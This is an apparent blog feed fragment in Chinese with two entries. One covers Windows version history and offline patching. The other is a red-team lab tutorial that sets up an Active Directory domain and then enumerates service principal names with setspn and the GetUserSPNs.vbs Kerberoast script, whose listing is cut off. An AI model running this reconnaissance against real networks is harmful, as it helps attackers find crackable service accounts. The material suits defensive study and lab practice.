class="headerlink" title="32位元操作系统"></a>32位元操作系统</h5><p>這個系列是<strong>Windows NT体系结构</strong>操作系统，是真正的纯32位操作系统。Windows NT架构操作系统是完整獨立的操作系统，不同於依然需要DOS基層程式的混合16/32位的Windows 9x。</p><h5 id="64位操作系统"><a href="#64位操作系统" class="headerlink" title="64位操作系统"></a>64位操作系统</h5><p>64位Windows NT架构操作系统，分为支持于<strong>IA-64</strong>架构和<strong>x64</strong>架构的两种不同版本。</p><p>在历史上微软曾对两种不同的64位架构提供支持，其一是Intel公司和HP联合开发具有革新化的Itanium家族架构，或称之为IA-64；和AMD公司开发的演进化的x86-64架构。微软在发布Windows Server 2012 R2前放弃了对Itanium架构的支持。因此现在微软的64位产品指的单单是x86-64架构，而在微软的词汇中称为x64。</p><p>支持Itanium家族架构的微软Windows产品有：</p><ul><li>Windows 2000 Advanced/Datacenter Server Limited Edition</li><li>Windows XP 64-bit Edition</li><li>Windows XP 64-bit Edition Version 2003</li><li>Windows Server 2003/2003 R2 Enterprise/Datacenter</li><li>Windows Server 2008/2008 R2 for Itanium Based System</li></ul><p>支持x64架构的Windows产品有：</p><ul><li>Windows XP Professional x64 Edition</li><li>Windows Server 2003/2003R2全线产品（Web版除外）</li><li>Windows Vista/7/8/8.1</li><li>Windows Server 2008/2008R2/2012/2012R2 全线产品</li><li>Windows 10</li></ul><blockquote><h4 id="以-Windows-CE-内核为基础的-Windows"><a href="#以-Windows-CE-内核为基础的-Windows" class="headerlink" title="以 Windows CE 内核为基础的 Windows"></a>以 Windows CE 内核为基础的 Windows</h4></blockquote><p>这个操作系统主要是用在嵌入式系统中或是硬体规格较低的电脑系统（例如很少的记忆体，较慢的中央处理器等）</p><ul><li>Pocket PC 2000</li><li>Pocket PC 2002</li><li>Windows Mobile 2003</li><li>Windows Mobile 2003 SE</li><li>Windows Mobile 5</li><li>Windows Mobile 6</li><li>Windows Mobile 6.1</li><li>Windows Mobile 6.5</li><li>Windows Mobile 6.5.3</li><li>Windows Phone 7</li></ul><h4 align="center" >Windows版本历史</h4><table><thead><tr><th align="center">发布时间</th><th align="center">版本代号</th><th align="center">正式名称</th><th align="center">最终组建</th></tr></thead><tbody><tr><td align="center">1985年11月20日</td><td align="center">1.01</td><td align="center">Windows 1.01 （已停止支持于2001/12/31）</td><td align="center">-</td></tr><tr><td align="center">1986年1月14日</td><td align="center">1.02</td><td align="center">Windows 1.02 （已停止支持于2001/12/30）</td><td align="center">-</td></tr><tr><td align="center">1986年8月14日</td><td align="center">1.03</td><td align="center">Windows 1.03 （已停止支持于2001/12/31）</td><td align="center">-</td></tr><tr><td align="center">1987年</td><td align="center">1.04</td><td align="center">Windows 1.04 （已停止支持于2001/12/31）</td><td align="center">-</td></tr><tr><td align="center">1987年12月9日</td><td align="center">2.03</td><td align="center">Windows 2.03 （已停止支持于2001/12/31）</td><td align="center">-</td></tr><tr><td align="center">1988年5月27日</td><td align="center">2.1</td><td align="center">Windows 2.1 （已停止支持于2001/12/31）</td><td align="center">-</td></tr><tr><td align="center">1988年5月27日</td><td align="center">2.1</td><td align="center">Windows/286 2.1 ( 已停止支持于2001/12/31)</td><td align="center">-</td></tr><tr><td align="center">1988年8月12日</td><td align="center">2.03</td><td align="center">Windows/386 2.03 ( 已停止支持于2001/12/31)</td><td align="center">-</td></tr><tr><td align="center">1990年5月22日</td><td align="center">3.0</td><td align="center">Windows 3.0 ( 已停止支持于2001/12/31)</td><td align="center">-</td></tr><tr><td align="center">1992年4月6日</td><td align="center">3.1</td><td align="center">Windows 3.1 ( 已停止支持于2001/12/31)</td><td align="center">103</td></tr><tr><td align="center">1993年7月27日</td><td align="center">NT 3.1</td><td align="center">Windows NT 3.1 ( 已停止支持于2000-12-31 )</td><td align="center">511(RTM-SP2),528(SP3)</td></tr><tr><td align="center">1993年8月11日</td><td align="center">WFW 3.11</td><td align="center">Windows For Workgroups 3.11 ( 已停止支持于2001/12/31)</td><td align="center">300</td></tr><tr><td align="center">1993年11月22日</td><td align="center">3.2</td><td align="center">Windows 3.2（简体中文版）( 已停止支持于2001/12/31 )</td><td align="center">153</td></tr><tr><td align="center">1994年9月21日</td><td align="center">NT 3.5</td><td align="center">Windows NT 3.5 ( 已停止支持于2001/12/31 )</td><td align="center">807</td></tr><tr><td align="center">1995年5月30日</td><td align="center">NT 3.51</td><td align="center">Windows NT 3.51 ( 已停止支持 于2001/12/31)</td><td align="center">1057</td></tr><tr><td align="center">1995年8月24日</td><td align="center">4.0</td><td align="center">Windows 95 ( 已停止支持于2001/12/31 )</td><td align="center">950(RTM,OSR1),1111(OSR2),1214(OSR2.1),1216(OSR2.5)</td></tr><tr><td align="center">1996年7月29日</td><td align="center">NT 4.0</td><td align="center">Windows NT 4.0 ( 已停止支持于2004/12/31)</td><td align="center">1381</td></tr><tr><td align="center">1996年11月16日</td><td align="center">CE 1.01</td><td align="center">Windows CE 1.01 ( 已停止支持 )</td><td align="center">-</td></tr><tr><td align="center">1997年11月1日</td><td align="center">CE 2.0</td><td align="center">Windows CE 2.0 ( 已停止支持 )</td><td align="center">-</td></tr><tr><td align="center">1998年1月8日</td><td align="center">CE 2.01</td><td align="center">Windows CE 2.01 ( 已停止支持 )</td><td align="center">-</td></tr><tr><td align="center">1998年3月1日</td><td align="center">CE 2.10</td><td align="center">Windows CE 2.10 ( 已停止支持 )</td><td align="center">-</td></tr><tr><td align="center">1998年5月15日</td><td align="center">4.1</td><td align="center">Windows 98 ( 已停止支持于2006/6/30)</td><td align="center">1998(RTM),2000(SP1)</td></tr><tr><td align="center">1998年7月1日</td><td align="center">CE 2.11</td><td align="center">Windows CE 2.11 ( 已停止支持 )</td><td align="center">-</td></tr><tr><td align="center">1999年4月23日</td><td align="center">4.1</td><td align="center">Windows 98 Second Edition（98 SE）( 已停止支持于2006/6/30 )</td><td align="center">2222</td></tr><tr><td align="center">1999年9月28日</td><td align="center">CE 2.12</td><td align="center">Windows CE 2.12 ( 已停止支持 )</td><td align="center">-</td></tr><tr><td align="center">2000年</td><td align="center">NT 5.0</td><td align="center">Windows 2000 ( 已停止支持于2010/7/13 )</td><td align="center">2195</td></tr><tr><td align="center">2000年</td><td align="center">4.9</td><td align="center">Windows Millennium Edition （ME）( 已停止支持于2006/6/30)</td><td align="center">3000</td></tr><tr><td align="center">2000年</td><td align="center">CE 3.0</td><td align="center">Windows CE 3.0 ( 已停止支持 )</td><td align="center">-</td></tr><tr><td align="center">2001年</td><td align="center">NT 5.1</td><td align="center">Windows XP ( 已停止支持于2014/4/8 )</td><td align="center">2600</td></tr><tr><td align="center">2002年</td><td align="center">CE 4.1</td><td align="center">Windows CE 4.1 （已停止支持）</td><td align="center">-</td></tr><tr><td align="center">2002年</td><td align="center">NT 5.1</td><td align="center">Windows XP Media Center Edition ( 已停止支持 )</td><td align="center">2600</td></tr><tr><td align="center">2002年</td><td align="center">NT 5.1</td><td align="center">Windows XP TabletPC Edition ( 已停止支持 )</td><td align="center">2600</td></tr><tr><td align="center">2003年</td><td align="center">NT 5.2</td><td align="center">Windows Server 2003 ( 已停止支持于2015/7/14 )</td><td align="center">3790</td></tr><tr><td align="center">2003年</td><td align="center">NT 5.2</td><td align="center">Windows XP 64-bit Edition ( 已停止支持 )</td><td align="center">2600(v2002),3790(v2003)</td></tr><tr><td align="center">2004年</td><td align="center">CE 5.0</td><td align="center">Windows CE 5.0 ( 已停止支持 )</td><td align="center">1400</td></tr><tr><td align="center">2005年</td><td align="center">NT 5.2</td><td align="center">Windows XP Professional x64 Edition ( 已停止支持 )</td><td align="center">3790</td></tr><tr><td align="center">2005年</td><td align="center">NT 5.2</td><td align="center">Windows Server 2003 x64 Editions ( 已停止支持 )</td><td align="center">3790</td></tr><tr><td align="center">2006年</td><td align="center">NT 5.1</td><td align="center">Windows Fundamentals for Legacy PCs ( 已停止支持 )</td><td align="center">2600</td></tr><tr><td align="center">2006年</td><td align="center">CE 6.0</td><td align="center">Windows Embedded CE 6.0 ( 已停止支持 )</td><td align="center">1937</td></tr><tr><td align="center">2007年</td><td align="center">NT 6.0</td><td align="center">Windows Vista ( 已停止支持于2017/4/11 )</td><td align="center">6000(RTM),6001(SP1),6002(SP2),6003(SP2 Update)</td></tr><tr><td align="center">2007年</td><td align="center">NT 6.0</td><td align="center">Windows Home Server ( 已停止支持 )</td><td align="center">1500(RTM),1800(PP1),2030(PP2),3436(PP3)</td></tr><tr><td align="center">2008年</td><td align="center">NT 6.0</td><td align="center">Windows Server 2008 ( 已停止支持于2020/1/14 )</td><td align="center">6001(RTM),6002(SP2),6003(SP2 Update)</td></tr><tr><td align="center">2009年</td><td align="center">NT 6.1</td><td align="center">Windows 7 ( 已停止支持于2020/1/14 )</td><td align="center">7600(RTM),7601(SP1)</td></tr><tr><td align="center">2009年</td><td align="center">NT 6.1</td><td align="center">Windows Server 2008 R2 ( 已停止支持于2020/1/14 )</td><td align="center">7600(RTM),7601(SP1)</td></tr><tr><td align="center">2010年</td><td align="center">CE 7.0</td><td align="center">Windows Phone 7 ( 已停止支持 )</td><td align="center">-</td></tr><tr><td align="center">2011年</td><td align="center">CE 7.0</td><td align="center">Windows Embedded Compact 7 ( 已停止支持 )</td><td align="center">-</td></tr><tr><td align="center">2011年</td><td align="center">NT 6.1</td><td align="center">Windows Home Server 2011 ( 已停止支持 )</td><td align="center">8800</td></tr><tr><td align="center">2012年</td><td align="center">NT 6.2</td><td align="center">Windows 8 ( 已停止支持于2016/1/12 )</td><td align="center">9200</td></tr><tr><td align="center">2012年</td><td align="center">NT 6.2</td><td align="center">Windows RT ( 已停止支持 )</td><td align="center">9200</td></tr><tr><td align="center">2012年</td><td align="center">NT 6.2</td><td align="center">Windows Server 2012 （至2023/1/9停止支持）</td><td align="center">9200</td></tr><tr><td align="center">2012年</td><td align="center">NT 6.2</td><td align="center">Windows Phone 8 （已停止支持）</td><td align="center">10322</td></tr><tr><td align="center">2013年</td><td align="center">NT 6.3</td><td align="center">Windows 8.1 （至2023/1/9停止支持）</td><td align="center">9600</td></tr><tr><td align="center">2013年</td><td align="center">NT 6.3</td><td align="center">Windows RT 8.1 （至2023/1/9停止支持）</td><td align="center">9600</td></tr><tr><td align="center">2013年</td><td align="center">NT 6.3</td><td align="center">Windows Server 2012 R2 （至2023/1/9停止支持）</td><td align="center">9600</td></tr><tr><td align="center">2014年</td><td align="center">NT 6.3</td><td align="center">Windows Phone 8.1 （已停止支持）</td><td align="center">12307</td></tr><tr><td align="center">2015年</td><td align="center">NT 10.0</td><td align="center">Windows 10 （每个家庭版和专业版支持1.5年每个教育版和企业版支持2.5年) || 10240</td><td align="center"></td></tr><tr><td align="center">2015年</td><td align="center">NT 10.0</td><td align="center">Windows 10 v1511</td><td align="center">10587</td></tr><tr><td align="center">2016年</td><td align="center">NT 10.0</td><td align="center">Windows 10 v1607</td><td align="center">14393</td></tr><tr><td align="center">2017年</td><td align="center">NT 10.0</td><td align="center">Windows 10 v1703</td><td align="center">15063</td></tr><tr><td align="center">2017年</td><td align="center">NT 10.0</td><td align="center">Windows 10 v1709</td><td align="center">16299</td></tr><tr><td align="center">2018年</td><td align="center">NT 10.0</td><td align="center">Windows 10 v1803</td><td align="center">17134</td></tr><tr><td align="center">2018年</td><td align="center">NT 10.0</td><td align="center">Windows 10 v1809</td><td align="center">17763</td></tr><tr><td align="center">2019年</td><td align="center">NT 10.0</td><td align="center">Windows 10 v1903</td><td align="center">18362</td></tr><tr><td align="center">2019年</td><td align="center">NT 10.0</td><td align="center">Windows 10 v1909</td><td align="center">18363</td></tr><tr><td align="center">2020年</td><td align="center">NT 10.0</td><td align="center">Windows 10 v2004</td><td align="center">19041</td></tr><tr><td align="center">2020年</td><td align="center">NT 10.0</td><td align="center">Windows 10 v2009</td><td align="center">19042</td></tr><tr><td align="center">2020年</td><td align="center">NT 10.0</td><td align="center">Windows 10 MN</td><td align="center">19645</td></tr><tr><td align="center">2020年</td><td align="center">NT 10.0</td><td align="center">Windows 10 FE</td><td align="center">20161(每个长期支持版本技术支持5年，加上扩展支持后共10年)</td></tr><tr><td align="center">2016年</td><td align="center">NT 10.0</td><td align="center">Windows 10 Mobile (已停止支持)</td><td align="center">10240(TH1),10587(TH2),14352(RS1),14822(RS2),16212(RS3)</td></tr><tr><td align="center">2016年</td><td align="center">NT 10.0</td><td align="center">Windows Server 2016 （至2026/10/13停止支持）</td><td align="center"></td></tr><tr><td align="center">2018年</td><td align="center">NT 10.0</td><td align="center">Windows Server 2019 （至2029/1/9停止支持）</td><td align="center"></td></tr></tbody></table><h3 id="Windows编号区别"><a href="#Windows编号区别" class="headerlink" title="Windows编号区别"></a>Windows编号区别</h3><blockquote><h4 id="R2和普通版本区别"><a href="#R2和普通版本区别" class="headerlink" title="R2和普通版本区别"></a>R2和普通版本区别</h4></blockquote><p>拿Windows Server 2008相关版本来举例，Windows Server 2008 是 Vista 的服务器版，Windows Server 2008  R2 是 Windows 7 的服务器版，也就是说他们使用的内核是不相同的，<strong>同时也可以通过系统是否带R2来区分是否是Windows Server版本，也就是说像Windows 7、Windows 8、Windows 10等操作系统是不存在有R2这种版本的</strong>。</p><blockquote><h4 id="SP1、SP2、SP3、SP4区别"><a href="#SP1、SP2、SP3、SP4区别" class="headerlink" title="SP1、SP2、SP3、SP4区别"></a>SP1、SP2、SP3、SP4区别</h4></blockquote><p>拿Windows 7相关版本来举例，Windows 7是最初始的发行版本，Windows 7 SP1是在Windows 7版本上的一个增量更新版本，同理SP2之类的都是相同的。</p><h3 id="Windows更新"><a href="#Windows更新" class="headerlink" title="Windows更新"></a>Windows更新</h3><blockquote><h4 id="联网更新"><a href="#联网更新" class="headerlink" title="联网更新"></a>联网更新</h4></blockquote><p>这个直接更新就行了简单的很，不多赘述</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/HardwareRelated/5.png?raw=true" alt="image-20201102175224207"></p><blockquote><h4 id="无网络更新"><a href="#无网络更新" class="headerlink" title="无网络更新"></a>无网络更新</h4></blockquote><p>比如需要安装KB4012212这个补丁，先去这个网站中搜索</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.catalog.update.microsoft.com&#x2F;home.aspx</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/HardwareRelated/6.png?raw=true" alt="image-20201102175840970"></p><p>从图中可以看到Windows 7有两个版本X86和X64版本，点进去就能看到对应的处理器版本</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/HardwareRelated/7.png?raw=true" alt="image-20201102180201399"></p><p>接着只要下载后安装即可</p><blockquote><blockquote><h5 id="离线补丁的一个坑"><a href="#离线补丁的一个坑" class="headerlink" title="离线补丁的一个坑"></a>离线补丁的一个坑</h5></blockquote></blockquote><p>安装补丁后无法重启服务器，一直跳到这个界面上面，主要的原因就是机器找不到启动位置了</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/HardwareRelated/10.png?raw=true" alt="image-20201104152001918"></p><p>首先打开命令提示符，然后输入下面内容部</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bcdedit &#x2F;enum &#123;default&#125;   #这一步要查看device属性，partation&#x3D; xxx</span><br><span class="line">bcdboot e:\windows        #根据上一步的结果，确认xxx是哪个盘符(一般是E盘)，然后回车执行</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/HardwareRelated/11.png?raw=true" alt="image-20201104152024338"></p><p>成功后重启机器即可</p><blockquote><h4 id="无网络快速找补丁"><a href="#无网络快速找补丁" class="headerlink" title="无网络快速找补丁"></a>无网络快速找补丁</h4></blockquote><p>有两种方法，第一种不适用于全部系统，有些系统没办法找到，第二种方法使用与全部系统</p><ul><li><p>首先下载个360安全卫士离线安装包，来搜索补丁</p></li><li><p>通过特定的语句在微软补丁网站来搜索补丁，如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2020-适用于 Windows Server 2019 的 09 更新</span><br><span class="line">#20XX-适用于 Windows XX 的 XX 更新</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>红蓝功防相关笔记总结</title>
    <link href="https://www.ascotbe.com/2020/08/03/IntranetPenetration/"/>
    <id>https://www.ascotbe.com/2020/08/03/IntranetPenetration/</id>
    <published>2020-08-03T13:45:42.000Z</published>
    <updated>2021-05-04T06:03:28.417Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>声明</p></blockquote><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p><blockquote><p>前言</p></blockquote><p>本文全程紧跟jumbo师傅写的文章来复现，内网对我来说是一个新的领域，文章会参考多个师傅中的分析来完成，当然有些自己的想法在里面，后续如果有新思路会往这里面添加</p><blockquote><p>PS</p></blockquote><p>目前就差委派没有写了</p><h2 id="搭建域环境"><a href="#搭建域环境" class="headerlink" title="搭建域环境"></a>搭建域环境</h2><blockquote><p>环境清单</p></blockquote><p>由于我们需要域环境模拟常规的内网，所以搭建域环境</p><ul><li>Windows 2008 R2 X64</li><li>Windows 10</li><li>Windows 7 SP1 X64</li></ul><p>Windows需要执行<code>set-executionpolicy remotesigned</code>来打开默认不允许执行ps脚本</p><h3 id="配置静态IP"><a href="#配置静态IP" class="headerlink" title="配置静态IP"></a>配置静态IP</h3><p>位置：网络和共享中心-&gt;本地连接-&gt;属性-&gt;IPV4</p><p>然后需要设置一个DNS指向本机，因为它后面是一个域控的角色，IP地址可以在详细信息里面看，最好和现在类似。</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/1.png?raw=true" alt="image-20200729222159021"></p><h3 id="配置域环境"><a href="#配置域环境" class="headerlink" title="配置域环境"></a>配置域环境</h3><p>在服务管理器中添加角色</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/2.png?raw=true" alt="image-20200729222459835"></p><p>然后勾选这个，这边提一句在创建域的时候还需要把当前用户设置为强密码</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/3.png?raw=true" alt="image-20200729222546079"></p><p>然后就是无脑下一步安装，就可以安装成功了</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/4.png?raw=true" alt="image-20200729222646209"></p><p>接着我们点开角色位置</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/5.png?raw=true" alt="image-20200729222814376"></p><p>会看到这个提示，我们只要点击蓝色的位置也就是<strong>dcpromo.exe</strong>就会出来这个页面</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/6.png?raw=true" alt="image-20200729222917906"></p><p>点击下一步</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/7.png?raw=true" alt="image-20200729223024238"></p><p>这边看了一下倾旋师傅写的<strong>Windows NT 4.0兼容的加密算法</strong>相关说明，这个算法是低版本的SMBv1客户端，在进行NTLM网络认证的过程中采用的算法较为简单，能够轻易破解，并且可能会受到Pass The Hash的技术手段利用、MS17-010等漏洞的危害，现在都是SMBv3的版本了</p><p>我们下一步</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/8.png?raw=true" alt="image-20200729223717033"></p><p>这边选择<strong>新林</strong>，林表示多个域的集合，因为我们只有一个域所以这边用新的林。如果你设置了密码还是报错说你账户密码不符合要求的话就在命令行里面输入即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user administrator &#x2F;passwordreq:yes</span><br></pre></td></tr></table></figure><p>然后这边会要我们输入一个域名，我这边就填我博客的域名了</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/9.png?raw=true" alt="image-20200729225803364"></p><p>接着下一步可以看到，选择级别，我们直接选默认的2003</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/10.png?raw=true" alt="image-20200729225859743"></p><p>一直下一步会弹出这个</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/11.png?raw=true" alt="image-20200729230152688"></p><p>点击是</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/12.png?raw=true" alt="image-20200729230236422"></p><p>然后设置DC管理员密码</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/13.png?raw=true" alt="image-20200729230312638"></p><p>下一步后就能看到设置内容了</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/14.png?raw=true" alt="image-20200729230418827"></p><p>然后点击完成后重启，这边等就好了</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/15.png?raw=true" alt="image-20200729230456239"></p><p>重启后可以看到配置成功了</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/16.png?raw=true" alt="image-20200729231055590"></p><h3 id="加入于环境"><a href="#加入于环境" class="headerlink" title="加入于环境"></a>加入于环境</h3><p>接着我们打开准备好的Windows 10来ping下域IP是否能通</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/17.png?raw=true" alt="image-20200729231256289"></p><p>然然后将当前主机的DNS服务器设置为DC的IP</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/18.png?raw=true" alt="image-20200729231448959"></p><p>然后ping下我们的域</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/19.png?raw=true" alt="image-20200729231549287"></p><p>接着找到系统属性</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/20.png?raw=true" alt="image-20200729231932391"></p><p>点击网络</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/21.png?raw=true" alt="image-20200729231951186"></p><p>点击下一步</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/22.png?raw=true" alt="image-20200729232030994"></p><p>点击下一步，然后到这个页面，我们填上用户名，然后先不要点击下一步</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/23.png?raw=true" alt="image-20200729234534909"></p><p>我们切换到windows 2008那台域控里面，新建一个用户</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/24.png?raw=true" alt="image-20200729232339467"></p><p>然后填写用户名</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/25.png?raw=true" alt="image-20200729234417477"></p><p>下一步后填写密码</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/26.png?raw=true" alt="image-20200729232533961"></p><p>然后我们回到Windows 10，填上我们设置好的密码，和域名</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/27.png?raw=true" alt="image-20200729234508295"></p><p>这边可能会报错说域不同，具体按上面写的信息来填就能到这一步</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/28.png?raw=true" alt="image-20200729234734276"></p><p>然后点击下一步，选着<strong>Users</strong>权限</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/29.png?raw=true" alt="image-20200729234817121"></p><p>下一步后重启完就行了</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/30.png?raw=true" alt="image-20200729234940152"></p><p>可以看到我们在域环境下并且能上网了</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/31.png?raw=true" alt="image-20200729235153363"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>在攻陷一台机器后，不要一味的直接去抓取机器密码、去做一些扫描内网的操作，因为如果网内有IDS等安全设备，有可能会造成报警，丢失权限。</p><h3 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a>SPN</h3><p>这个也是我第一次接触，谷歌了一下，这边直接饮用官方介绍。SPN 是服务在使用 Kerberos 身份验证的网络上的唯一标识符，它由服务类、主机名和端口组成。在使用 Kerberos 身份验证的网络中，必须在内置计算机帐户（如 NetworkService 或 LocalSystem）或用户帐户下为服务器注册 SPN。对于内置帐户，SPN 将自动进行注册。</p><blockquote><p>特点</p></blockquote><p>在查询SPN的时候，会向域控制器发起LDAP查询，这是正常Kerberos票据行为的一部分，所以这个操作很难被检测出来。且不需要进行大范围扫描，效率高，不需要与目标主机建立链接，可以快速发现内网中的资产以及服务</p><ol><li><p><strong>利用Windows自带的setspn工具，普通域用户权限执行即可</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -T domain.com -Q */*</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/32.png?raw=true" alt="image-20200730212937561"></p><p>由截图可以看到<strong>WIN-1OUEMJB0766</strong>（DC服务器）上面运行DNS服务，该命令可以把内网的相关服务都扫描出来包括mysql之类的</p></li><li><p><strong>利用GetUserSPNs.vbs获取SPN结果</strong></p><p>项目地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;nidem&#x2F;kerberoast</span><br></pre></td></tr></table></figure><p>其中的源码</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&#x27; Edits by Tim Medin</span></span><br><span class="line"><span class="comment">&#x27; File:     GetUserSPNS.vbs</span></span><br><span class="line"><span class="comment">&#x27; Contents: Query the domain to find SPNs that use User accounts</span></span><br><span class="line"><span class="comment">&#x27; Comments: This is for use with Kerberoast https://github.com/nidem/kerberoast</span></span><br><span class="line"><span class="comment">&#x27;           The password hash used with Computer accounts are infeasible to </span></span><br><span class="line"><span class="comment">&#x27;           crack; however, if the User account associated with an SPN may have</span></span><br><span class="line"><span class="comment">&#x27;           a crackable password. This tool will find those accounts. You do not</span></span><br><span class="line"><span class="comment">&#x27;           need any special local or domain permissions to run this script. </span></span><br><span class="line"><span class="comment">&#x27;           This script on a script supplied by Microsoft (details below).</span></span><br><span class="line"><span class="comment">&#x27; History:    2014/11/12     Tim Medin    Created</span></span><br><span class="line"><span class="comment">&#x27;</span></span><br><span class="line"><span class="comment">&#x27; Original Script Details:</span></span><br><span class="line"><span class="comment">&#x27; Copyright (c) Microsoft Corporation 2004 -</span></span><br><span class="line"><span class="comment">&#x27; File:                querySpn.vbs</span></span><br><span class="line"><span class="comment">&#x27; Contents:     Query a given SPN in a given forest to find the owners</span></span><br><span class="line"><span class="comment">&#x27; History:         7/7/2004     Craig Wiand     Created        </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Option</span> <span class="keyword">Explicit</span>         </span><br><span class="line"><span class="keyword">Dim</span> oConnection, oCmd, oRecordSet</span><br><span class="line"><span class="keyword">Dim</span> oGC, oNSP</span><br><span class="line"><span class="keyword">Dim</span> strGCPath, strClass, strADOQuery</span><br><span class="line"><span class="keyword">Dim</span> vObjClass, vSPNs, vName</span><br><span class="line"></span><br><span class="line">ParseCommandLine()</span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27;--- Set up the connection ---</span></span><br><span class="line"><span class="keyword">Set</span> oConnection = <span class="built_in">CreateObject</span>(<span class="string">&quot;ADODB.Connection&quot;</span>)</span><br><span class="line"><span class="keyword">Set</span> oCmd = <span class="built_in">CReateObject</span>(<span 